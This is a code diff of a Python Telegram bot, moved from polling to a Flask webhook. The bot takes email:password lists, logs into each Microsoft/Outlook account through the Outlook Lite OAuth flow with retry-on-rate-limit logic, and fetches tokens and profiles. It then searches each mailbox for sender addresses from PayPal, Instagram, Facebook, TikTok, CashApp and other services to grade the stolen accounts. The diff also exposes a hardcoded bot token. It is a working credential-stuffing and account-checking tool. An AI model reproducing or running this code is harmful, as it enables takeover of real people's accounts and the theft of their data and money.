@@ -1,66 +1,62 @@
-import requests
+from flask import Flask, request
 import telebot
 import threading
 from telebot.types import InlineKeyboardButton as but, InlineKeyboardMarkup as key
-import requests, types
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from telebot import types
+import requests
 import os
-import telebot 
 import re, json
 import time, random
 import string
 from datetime import datetime, timedelta
-from faker import Faker
-from multiprocessing import Process
-import threading
-import user_agent, ast
-import asyncio, datetime
-import io
-import os, uuid, concurrent.futures
-try:
-    import requests
-    from rich.console import Console
-    from rich.panel import Panel
-except ImportError:
-    os.system('pip install requests rich')
-    os.system('clear')  
+import uuid
 
+app = Flask(__name__)
+token = '7196328739:AAH7JzdUEvWm2VbrPAO4HxkHDwzHHhmRnAo'
+bot = telebot.TeleBot(token, parse_mode="HTML")
+WEBHOOK_URL = "https://yourapp.onrender.com/webhook"  # Replace with Render URL after deployment
+
+# Store state
 a, b = 0, 0
-a = 0
 correct_count = 0
 incorrect_count = 0
-token1 = '7196328739:AAH7JzdUEvWm2VbrPAO4HxkHDwzHHhmRnAo'
 id = '6196885948'
 command_usage = {}
 stopuser = {}
-token = token1
-bot = telebot.TeleBot(token, parse_mode="HTML")
-
-# Store the last processed account details globally
 last_account_details = {}
 
-# Function to safely send Telegram messages
+# Safe send/edit message functions (unchanged)
 def safe_send_message(chat_id, text, parse_mode="HTML", reply_markup=None):
     try:
         bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
     except Exception as e:
         print(f"Telegram API error: {e}")
-        # Fallback: send without parse_mode if HTML fails
         try:
             bot.send_message(chat_id, text, parse_mode=None, reply_markup=reply_markup)
         except Exception as e:
             print(f"Fallback Telegram API error: {e}")
 
-# Function to safely edit Telegram messages
 def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
     try:
         bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode, reply_markup=reply_markup)
     except Exception as e:
         print(f"Telegram API edit error: {e}")
-        # Fallback: send a new message instead of editing
         safe_send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
 
+# Webhook route
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        update = telebot.types.Update.de_json(request.get_json())
+        bot.process_new_updates([update])
+        return 'OK', 200
+    return 'Invalid content type', 400
+
+# Health check
+@app.route('/')
+def home():
+    return "Bot is running"
+
+# Bot handlers (unchanged from your code)
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -105,7 +101,7 @@ def menu_callback(call):
         accounts_list = accounts.splitlines()
         for line in accounts_list:
             if stopuser[f'{id}']['status'] == 'stop':
-                safe_send_message(call.from_user.id, text='𝗗𝗢𝗡𝗘 𝗕𝗢𝗧 𝗦𝗧𝗢𝗣𝗣𝗘𝗗')
+                safe_send_message(call.from_user.id, text='𝗗𝗢𝗡𝗘 𝗕𝗢𝗧 𝗦T𝗢𝗣𝗣𝗘𝗗')
                 return
             if ":" not in line:
                 print(f"Skipping invalid line: {line}")
@@ -132,10 +128,9 @@ def menu_callback(call):
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "en-US,en;q=0.9",
             }
-            # Retry logic for initial request
             for attempt in range(3):
                 try:
-                    response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
+                    response = requests.get(f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
                     if response.status_code == 429:
                         print(f"Rate limited for {email}. Retrying after delay...")
                         time.sleep(random.uniform(5, 10))
@@ -183,7 +178,6 @@ def menu_callback(call):
                     "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "en-US,en;q=0.9",
                     "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
-                # Retry logic for login request
                 for attempt in range(3):
                     try:
                         res = requests.post(URL, data=lenn, headers=headers, allow_redirects=False)
@@ -211,7 +205,7 @@ def menu_callback(call):
                     sto = types.InlineKeyboardButton(f"𝗧𝗢𝗧𝗔𝗟 𝗟𝗜𝗡𝗘𝗦: {total}", callback_data='lion')
                     stop = types.InlineKeyboardButton(f"STOP", callback_data='stop')
                     mes.add(cm1, status, cm2, sto, stop)
-                    safe_edit_message(call.message.chat.id, call.message.message_id, f'''𝗣𝗥𝗢𝗖𝗖𝗘𝗦𝗦𝗜𝗡𝗚''', reply_markup=mes)
+                    safe_edit_message(call.message.chat.id, call.message.message_id, f'''𝗣R𝗢𝗖𝗖𝗘𝗦𝗦𝗜𝗡𝗚''', reply_markup=mes)
                 else:
                     b += 1
                     mes = types.InlineKeyboardMarkup(row_width=1)
@@ -221,9 +215,8 @@ def menu_callback(call):
                     sto = types.InlineKeyboardButton(f"𝗧𝗢𝗧𝗔𝗟 𝗟𝗜𝗡𝗘𝗦: {total}", callback_data='lion')
                     stop = types.InlineKeyboardButton(f"STOP", callback_data='stop')
                     mes.add(cm1, status, cm2, sto, stop)
-                    safe_edit_message(call.message.chat.id, call.message.message_id, f'''𝗣𝗥𝗢𝗖𝗖𝗘𝗦𝗦𝗜𝗡𝗚''', reply_markup=mes)
+                    safe_edit_message(call.message.chat.id, call.message.message_id, f'''𝗣R𝗢𝗖𝗖𝗘𝗦𝗦𝗜𝗡𝗚''', reply_markup=mes)
 
-                # Check if Location header exists before splitting
                 location = hh.get('Location')
                 if location is None:
                     print(f"Skipping account {email}:{password} - No Location header in response")
@@ -248,7 +241,6 @@ def menu_callback(call):
                     "code": Code,
                     "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                 }
-                # Retry logic for token request
                 for attempt in range(3):
                     try:
                         response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
@@ -280,7 +272,6 @@ def menu_callback(call):
                     "Connection": "Keep-Alive",
                     "Accept-Encoding": "gzip"
                 }
-                # Retry logic for profile request
                 for attempt in range(3):
                     try:
                         r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
@@ -320,7 +311,6 @@ def menu_callback(call):
                     "accept-encoding": "gzip, deflate",
                     "accept-language": "en-US,en;q=0.9"
                 }
-                # Retry logic for startup data request
                 for attempt in range(3):
                     try:
                         rese = requests.post(url, headers=headers, data="").text
@@ -336,7 +326,7 @@ def menu_callback(call):
                 V1 = '𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 ✅️' if 'security@facebookmail.com' in rese else None
                 V2 = '𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ✅️' if 'security@mail.instagram.com' in rese else None
                 V3 = '𝗣𝗨𝗕𝗚 ✅️' if "noreply@pubgmobile.com" in rese else None
-                V4 = '𝗞𝗢𝗡𝗔𝗠𝗜 ✅ '  if 'nintendo-noreply@ccg.nintendo.com' in rese else None
+                V4 = 'K𝗢𝗡𝗔𝗠𝗜 ✅ '  if 'nintendo-noreply@ccg.nintendo.com' in rese else None
                 V5 = '𝗧𝗜𝗞𝗧𝗢𝗞 ✅️' if 'register@account.tiktok.com' in rese else None
                 V6 = '𝗧𝗪𝗜𝗧𝗧𝗘𝗥 ✅️' if 'info@x.com' in rese else None
                 V7 = '𝗣𝗔𝗬𝗣𝗔𝗟 ✅️' if 'service@paypal.com.br' in rese else None
@@ -355,7 +345,7 @@ def menu_callback(call):
                 V20 = '𝗕𝗜𝗧𝗞𝗨𝗕 ✅️' if 'no-reply@bitkub.com' in rese else None
                 V21 = '𝗛𝗢𝗦𝗧𝗜𝗡𝗚𝗘𝗥 ✅️' if '‏no-reply@account.hostinger.com‏' in rese else None
                 V22 = '𝗢𝗡𝗟𝗬𝗙𝗔𝗡𝗦 ✅️' if 'support@onlyfans.com' in rese else None
-                V23 = '𝗟𝗜𝗡𝗞𝗘𝗗𝗜𝗡 ✅️' if 'messages-noreply@linkedin.com' in rese else None
+                V23 = 'L𝗜𝗡𝗞𝗘𝗗𝗜𝗡 ✅️' if 'messages-noreply@linkedin.com' in rese else None
                 V24 = 'CASHAPP ✅️' if 'cash@square.com' in rese else None
                 h = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20, V21, V22, V23, V24])
                 hh = "\n".join(h)
@@ -383,7 +373,7 @@ def button_callback(call):
     if id in last_account_details:
         safe_send_message(call.message.chat.id, last_account_details[id])
     else:
-        safe_send_message(call.message.chat.id, "𝗡𝗢 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗣𝗥𝗢𝗖𝗖𝗘𝗦𝗦𝗘𝗗")
+        safe_send_message(call.message.chat.id, "𝗡𝗢 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗘𝗗")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'lion')
 def menu_callback(call):
@@ -392,10 +382,9 @@ def menu_callback(call):
     except Exception as e:
         print(f"Error in lion callback: {e}")
 
-print("تم تشغيل البوت")
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(f"Bot polling error: {e}")
-        time.sleep(5)  # Wait before retrying to avoid rapid failure loops
+# Set webhook
+bot.remove_webhook()  # Clear any existing webhook
+bot.set_webhook(url=WEBHOOK_URL)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
